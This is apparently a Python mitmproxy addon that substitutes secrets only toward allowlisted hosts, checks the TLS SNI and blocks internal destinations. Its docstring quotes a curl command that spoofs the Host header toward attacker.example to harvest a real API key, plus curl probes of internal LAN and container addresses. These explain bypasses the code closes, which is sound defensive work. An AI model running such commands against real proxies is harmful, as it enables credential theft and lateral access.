"""
desolate-proxy: transparent secret-substitution addon for mitmproxy.

Config lives at /etc/desolate-proxy/settings.json (override with DESOLATE_SETTINGS).
Secrets are keyed by their PLACEHOLDER NAME, which is exactly the string your
devcontainers put in .env files:

    .env inside devcontainer:   OPENAI_API_KEY=MY-AWESOME-PROJECT-OPENAI-KEY
    settings.json in the VM:    "MY-AWESOME-PROJECT-OPENAI-KEY":
                                    {"value": "sk-...", "hosts": ["api.openai.com"]}

Behavior per request:
  0. Refuse any request whose destination ADDRESS is internal (see below).
  1. Establish the PROVEN destination (see below).
  2. Network policy (ordered allow/deny rules, first match wins).
  3. Scan URL + headers + body for any configured placeholder.
  4. If a placeholder is found but the proven destination is NOT in that
     secret's allowlist -> block 403 (leak detection / honeypot defense).
  5. Otherwise substitute every occurrence with the real value.
  6. On responses, scrub real values back to placeholders so a secret can
     never enter the container even if an endpoint echoes it.

Redirect safety falls out of the model: substitution is decided per-request,
so a redirect to an unlisted host receives the placeholder, which trips rule 4.

---------------------------------------------------------------------------
WHY "PROVEN DESTINATION" AND NOT THE HOST HEADER
---------------------------------------------------------------------------
mitmproxy's `request.pretty_host` prefers the Host header, which the CLIENT
sends. In transparent mode the client also chooses the IP it connects to, and
those two are independent. Deciding on the Host header was therefore a total
bypass of this whole design, over plain HTTP *and* over TLS:

    curl http://attacker.example/  -H 'Host: api.openai.com' \
                                   -H 'Authorization: Bearer MYAPP-OPENAI-KEY'

The addon saw "api.openai.com", found it allowlisted, substituted the real key
-- and mitmproxy delivered it to the original destination, i.e. the attacker.
Any code in any devcontainer could harvest every configured secret this way.

So the destination is taken from the TLS SNI, which is bound to the connection
that will actually carry the request, and the Host header must MATCH it. An
attacker who instead sets SNI=api.openai.com toward their own IP cannot
complete the handshake: mitmproxy verifies the upstream certificate against
that name.

Plain HTTP has no SNI and therefore no provable destination at all. Requests
that carry a placeholder over plaintext are refused rather than guessed at.

---------------------------------------------------------------------------
WHY INTERNAL DESTINATIONS ARE REFUSED BEFORE ANYTHING ELSE
---------------------------------------------------------------------------
nftables REDIRECTs every :80 and :443 from the container bridges here,
whatever the destination address was. This proxy then dials that destination
from the VM -- where the source is no longer a container bridge, so neither
the forward default-deny nor the input drop applies to it. That makes this
process a confused deputy: the one component standing on both sides of the
containment boundary.

    curl http://192.168.5.2/     # the Mac, over Colima's vmnet
    curl http://172.17.0.2/      # a container on another docker bridge

Both were redirected here and both were forwarded, because the network policy
matches on a NAME (fnmatch) and the shipped default is {"host": "*"} -- which
an IP literal matches. A name check cannot fix this on its own either: a
public hostname whose A record points at 127.0.0.1 or 10.x satisfies any
allowlist (DNS rebinding). So the check below is on the ADDRESS, and it runs
before the name is consulted at all.

It is NOT the whole wall. `tls_passthrough` entries are tunnelled from
`tls_clienthello` and never reach `request()`, so they never reach this check
either -- and the SNI they match on is chosen by the client. Every glob added
to `tls_passthrough` is a hole in this check, not just in interception.

Set "allow_private_destinations": true in settings.json only if you are
deliberately proxying to something on the LAN, and understand that it removes
the wall for :80/:443.

---------------------------------------------------------------------------
WHAT MAKES A SECRET'S CONFIGURATION USABLE AT ALL
---------------------------------------------------------------------------
Two properties of a `secrets` entry are load-bearing, and both fail quietly.
They are checked when settings.json is read, and a secret that fails either is
DROPPED -- which is the safe direction: an unknown placeholder is substituted
nowhere, so it travels as itself and no value can leave.

  * Every entry in `hosts` must PIN a destination. "*" is not an allowlist,
    it is the absence of one spelled so it looks deliberate, and it turns the
    placeholder back into a bearer token that any container may post
    anywhere. Wildcards are accepted only where a TLS certificate accepts
    them: one leading label, over a name with at least two literal labels of
    its own. So "*.openai.com" is fine, while "*", "*.com" and "*openai.com"
    are not -- fnmatch's "*" does not stop at a dot, so that last one also
    matches "evilopenai.com".

  * No placeholder name may contain another. Substitution is a plain string
    replace and detection a plain substring search, so with MY_KEY and
    MY_KEY2 both configured, a request carrying MY_KEY2 is judged against
    MY_KEY's allowlist and receives MY_KEY's value with a stray "2" left
    glued to it. A minimum name LENGTH used to stand in for this check; it
    never prevented the thing it was named for.
"""

import fnmatch
import ipaddress
import json
import logging
import os
import re

from mitmproxy import http

SETTINGS_PATH = os.environ.get("DESOLATE_SETTINGS", "/etc/desolate-proxy/settings.json")
MAX_BODY = 5 * 1024 * 1024  # skip substitution/scrubbing in bodies larger than this

GLOB_META = re.compile(r"[*?\[\]]")
# "*." followed by two or more literal labels -- the one wildcard shape a TLS
# certificate would also accept. See the header.
PINNED_WILDCARD = re.compile(r"\*\.(?:[^*?\[\]./]+\.)+[^*?\[\]./]+\Z")


def host_pattern_problem(pattern):
    """Why this `hosts` entry cannot pin a destination, or None if it can.

    Only the SECRET allowlist goes through here. The `network` rules are a
    different list with a different job -- they decide reachability, where a
    deliberate "*" is the shipped default and means "the path is default-deny,
    the destination set is not".
    """
    if not isinstance(pattern, str) or not pattern.strip():
        return "is empty"
    if not GLOB_META.search(pattern):
        return None                      # a literal name pins itself
    if PINNED_WILDCARD.fullmatch(pattern):
        return None
    if not GLOB_META.sub("", pattern).strip("."):
        return ("matches every host, so this secret would have no allowlist at "
                "all -- name the hosts it may be sent to")
    return ("puts a wildcard somewhere it cannot be trusted: only "
            "'*.<name>.<tld>' is accepted, because '*' does not stop at a dot "
            "('*foo.com' also matches 'evilfoo.com', and '*.com' is a whole TLD)")

# stdlib logging, not ctx.log: ctx.log is deprecated and its removal would raise
# inside the request hook -- and mitmproxy answers an addon exception by letting
# the request through. That fail-open is exactly what this file must not do.
log = logging.getLogger("desolate-proxy")


class DesolateProxy:
    def __init__(self):
        self._mtime = None
        self.secrets = {}          # placeholder -> {"value": str, "hosts": [glob...]}
        self.network = []          # [{"action","host","method"?}, ...]
        self.default_action = "allow"
        self.scrub_responses = True
        self.tls_passthrough = []  # SNI globs to tunnel without interception
        self.allow_private_destinations = False

    # ---------- config ----------

    def _maybe_reload(self):
        try:
            mtime = os.stat(SETTINGS_PATH).st_mtime
        except FileNotFoundError:
            if self._mtime is not None:
                log.error(f"settings file missing: {SETTINGS_PATH}; keeping last config")
            return
        if mtime == self._mtime:
            return
        try:
            with open(SETTINGS_PATH) as f:
                cfg = json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            log.error(f"failed to load {SETTINGS_PATH}: {e}; keeping last config")
            return

        secrets = {}
        for name, entry in cfg.get("secrets", {}).items():
            value = entry.get("value", "")
            hosts = entry.get("hosts", [])
            if not value:
                log.warning(f"secret {name!r} has empty value; skipping")
                continue
            if not hosts:
                log.warning(f"secret {name!r} has no hosts allowlist; skipping (refusing wildcard-by-omission)")
                continue
            problems = [(h, p) for h in hosts if (p := host_pattern_problem(h))]
            if problems:
                for host, problem in problems:
                    log.error(f"secret {name!r}: host {host!r} {problem}")
                log.warning(f"secret {name!r} skipping (its allowlist does not pin a destination)")
                continue
            secrets[name] = {"value": value, "hosts": [h.lower() for h in hosts]}

        for name in self._overlapping(secrets):
            del secrets[name]

        self.secrets = secrets
        self.network = cfg.get("network", [])
        self.default_action = cfg.get("default_action", "allow")
        self.scrub_responses = cfg.get("scrub_responses", True)
        self.tls_passthrough = [h.lower() for h in cfg.get("tls_passthrough", [])]
        self.allow_private_destinations = bool(cfg.get("allow_private_destinations", False))
        self._mtime = mtime
        log.info(f"loaded {len(self.secrets)} secret(s), {len(self.network)} network rule(s), "
                 f"default_action={self.default_action}, "
                 f"allow_private_destinations={self.allow_private_destinations}")

    # ---------- helpers ----------

    @staticmethod
    def _overlapping(secrets):
        """Placeholder names that contain, or are contained by, another one.

        Both members of a colliding pair are returned, never just one: keeping
        the longer would quietly change which secret a request is judged
        against, and this file's whole job is to make that decision legible.

        A minimum name length was the previous defence, and it does not
        actually defend: MYAPP-OPENAI-KEY and MYAPP-OPENAI-KEY-2 clear any
        length bar and still collide. See the module header for what the
        collision does to a request.
        """
        names = sorted(secrets)
        overlapping = set()
        for index, name in enumerate(names):
            for other in names[index + 1:]:
                if name in other or other in name:
                    log.error(f"placeholders {name!r} and {other!r} overlap (one contains "
                              f"the other), so neither can be substituted unambiguously; "
                              f"dropping both -- rename one")
                    overlapping.update((name, other))
        return overlapping

    @staticmethod
    def _host_matches(host, patterns):
        host = (host or "").lower()
        return any(fnmatch.fnmatch(host, p) for p in patterns)

    @staticmethod
    def proven_host(flow):
        """The destination this connection can be PROVEN to be talking to.

        The TLS SNI, and only the TLS SNI. It is bound to the handshake that
        mitmproxy validates the upstream certificate against, so a client
        cannot claim a name it does not control. Returns None for plaintext
        HTTP, where no such proof exists.
        """
        sni = getattr(flow.client_conn, "sni", None)
        return sni.lower() if sni else None

    @staticmethod
    def destination_address(flow):
        """The address this connection actually goes to, or None if not an IP.

        Ordered, and the FIRST thing that parses as an IP literal wins. In
        transparent mode `request.host` IS the original destination for
        plaintext, which is the case that matters most; for TLS mitmproxy fills
        it from the SNI instead, so that falls through to the connection's own
        addresses. Anything that does not parse is a name, not a destination we
        can judge here, and is skipped rather than guessed at.
        """
        candidates = [getattr(flow.request, "host", None)]
        conn = getattr(flow, "server_conn", None)
        for attribute in ("peername", "address"):
            value = getattr(conn, attribute, None) if conn is not None else None
            if isinstance(value, (tuple, list)) and value:
                candidates.append(value[0])

        for candidate in candidates:
            if not isinstance(candidate, str) or not candidate:
                continue
            try:
                return ipaddress.ip_address(candidate.strip("[]"))
            except ValueError:
                continue
        return None

    @staticmethod
    def is_internal(address):
        """Whether a container must never be able to reach this address.

        `not is_global` is the primary test, and it is the primary test on
        purpose. The obvious alternative -- `is_private or is_loopback or ...`
        -- misses RFC 6598 shared address space (100.64.0.0/10), which CPython
        does not classify as private. That range is where a tailnet lives, so
        on any host running Tailscale it is the LAN, and leaving it out would
        forward exactly the traffic this check exists to refuse.

        The explicit terms are kept alongside it for two reasons: multicast is
        `is_global == True` under that definition and still must not be
        reachable, and the meaning of these predicates has moved across CPython
        releases (both shared space and IPv4-mapped addresses have changed
        classification). Stating the boundary rather than inheriting it keeps it
        from shifting under the interpreter in the venv.
        """
        if address is None:
            return False
        # ::ffff:192.168.5.2 is 192.168.5.2 in another spelling. Judge the host,
        # not the encoding.
        mapped = getattr(address, "ipv4_mapped", None)
        if mapped is not None:
            address = mapped
        return (not address.is_global
                or address.is_private or address.is_loopback
                or address.is_link_local or address.is_multicast
                or address.is_reserved or address.is_unspecified)

    @staticmethod
    def host_header(flow):
        """The Host / :authority the client CLAIMED, minus any port. Untrusted."""
        raw = flow.request.host_header
        if not raw:
            return None
        raw = raw.strip()
        if raw.startswith("["):                 # [::1]:443
            return raw.split("]", 1)[0][1:].lower()
        if raw.count(":") == 1:                 # host:port (never a bare IPv6)
            raw = raw.rsplit(":", 1)[0]
        return raw.lower()

    def _network_allowed(self, host, method):
        for rule in self.network:
            if not self._host_matches(host, [str(rule.get("host", "*")).lower()]):
                continue
            m = rule.get("method")
            if m and m.upper() != method.upper():
                continue
            return rule.get("action", "deny") == "allow"
        return self.default_action == "allow"

    @staticmethod
    def _block(flow, code, msg):
        flow.response = http.Response.make(
            code, f"desolate-proxy: {msg}\n".encode(), {"content-type": "text/plain"}
        )

    def _placeholders_in_request(self, flow):
        """Return the set of configured placeholder names present anywhere in the request."""
        found = set()
        url = flow.request.url
        header_blob = "\n".join(f"{k}: {v}" for k, v in flow.request.headers.items(multi=True))
        body = flow.request.raw_content or b""
        body_search = body if len(body) <= MAX_BODY else b""
        for name in self.secrets:
            if name in url or name in header_blob or name.encode() in body_search:
                found.add(name)
        return found

    # ---------- mitmproxy hooks ----------

    def tls_clienthello(self, data):
        try:
            self._maybe_reload()
            sni = (data.client_hello.sni or "").lower()
            if sni and self._host_matches(sni, self.tls_passthrough):
                data.ignore_connection = True  # tunnel raw; no interception, no substitution
        except Exception:
            log.exception("tls_clienthello failed; not passing through")

    def request(self, flow: http.HTTPFlow):
        # Everything below is wrapped: mitmproxy responds to an uncaught addon
        # exception by forwarding the request unmodified, which would silently
        # disable secret policy while traffic keeps flowing. Fail closed.
        try:
            self._request(flow)
        except Exception:
            log.exception("desolate-proxy addon error; blocking request (fail-closed)")
            self._block(flow, 502, "internal policy error; request refused")

    def _request(self, flow: http.HTTPFlow):
        self._maybe_reload()
        method = flow.request.method
        proven = self.proven_host(flow)
        claimed = self.host_header(flow)

        # 0) destination address -- BEFORE the name is consulted, because the
        # name is the part an attacker chooses. See the module header.
        if not self.allow_private_destinations:
            destination = self.destination_address(flow)
            if self.is_internal(destination):
                log.warning(f"DENY  {method} -> {destination} (internal destination; "
                            f"claimed {claimed!r}, sni {proven!r})")
                self._block(flow, 403,
                            f"destination {destination} is internal to the host; "
                            f"containers may not reach it through this proxy")
                return

        # 1) network policy -- on the proven name where we have one.
        policy_host = proven or claimed or flow.request.host
        if not self._network_allowed(policy_host, method):
            log.warning(f"DENY  {method} {policy_host}{flow.request.path} (network policy)")
            self._block(flow, 403, f"network policy denied {method} {policy_host}")
            return

        # 2) leak detection -- strictly on the proven name.
        found = self._placeholders_in_request(flow)
        if found:
            if proven is None:
                log.warning(f"LEAK  placeholder(s) {sorted(found)} sent over PLAINTEXT to "
                            f"{flow.request.host!r} (claimed {claimed!r}) -- blocked")
                self._block(flow, 403,
                            f"secret {sorted(found)} may not be sent over plaintext HTTP "
                            f"(no verifiable destination); use https")
                return
            if claimed is not None and claimed != proven:
                log.warning(f"LEAK  Host header {claimed!r} does not match TLS SNI {proven!r} "
                            f"while carrying {sorted(found)} -- blocked")
                self._block(flow, 403,
                            f"Host header '{claimed}' does not match the TLS destination "
                            f"'{proven}'; refusing to substitute a secret")
                return
            for name in sorted(found):
                if not self._host_matches(proven, self.secrets[name]["hosts"]):
                    log.warning(f"LEAK  placeholder {name!r} sent toward {proven!r} "
                                f"(allowed: {self.secrets[name]['hosts']}) -- blocked")
                    self._block(flow, 403, f"secret {name} is not permitted for host {proven}")
                    return

        # 3) substitution. Order does not matter here, and that is a property
        # the config check buys: no loaded placeholder contains another (see
        # _overlapping), so no replacement can land inside a different one.
        for name in found:
            value = self.secrets[name]["value"]
            # .path, NOT .url -- and this is load-bearing, not style.
            #
            # Assigning flow.request.url re-parses it into scheme/host/port/path
            # and, as a side effect, REWRITES THE HOST HEADER to whatever host
            # the URL names. In transparent mode request.host is the destination
            # IP, so `request.url = request.url` -- a byte-identical assignment,
            # which is what this was when the placeholder lived in a header
            # rather than the URL -- silently replaced `Host: api.openai.com`
            # with `Host: 162.159.140.245`. The upstream CDN then has no idea
            # which site is being addressed and answers with an HTML 403 that
            # mentions neither the header nor us.
            #
            # It only bit once a secret was actually registered, because this
            # loop does not run otherwise: without the secret the request went
            # out intact and returned a truthful 401.
            #
            # request.path covers path AND query string, which is the only part
            # of a URL a placeholder can realistically appear in, and assigning
            # it leaves host and headers alone.
            if name in flow.request.path:
                flow.request.path = flow.request.path.replace(name, value)
            for k, v in list(flow.request.headers.items(multi=True)):
                if name in v:
                    flow.request.headers[k] = v.replace(name, value)
            body = flow.request.raw_content or b""
            if body and len(body) <= MAX_BODY and name.encode() in body:
                # .content (not .raw_content) so Content-Length / encodings stay correct
                flow.request.content = flow.request.content.replace(name.encode(), value.encode())

        if found:
            log.info(f"SUBST {method} {proven}{flow.request.path} <- {sorted(found)}")

    def response(self, flow: http.HTTPFlow):
        try:
            self._response(flow)
        except Exception:
            # A scrub failure must not leak the response through unscrubbed.
            log.exception("desolate-proxy response scrub failed; blocking response (fail-closed)")
            self._block(flow, 502, "internal policy error; response withheld")

    def _response(self, flow: http.HTTPFlow):
        if not self.scrub_responses or not flow.response:
            return
        for name, entry in self.secrets.items():
            value, bvalue = entry["value"], entry["value"].encode()
            for k, v in list(flow.response.headers.items(multi=True)):
                if value in v:
                    flow.response.headers[k] = v.replace(value, name)
            body = flow.response.raw_content or b""
            if body and len(body) <= MAX_BODY and bvalue in body:
                flow.response.content = flow.response.content.replace(bvalue, name.encode())
                log.warning(f"SCRUB response from {flow.request.pretty_host} echoed secret "
                            f"{name!r}; replaced with placeholder")


addons = [DesolateProxy()]
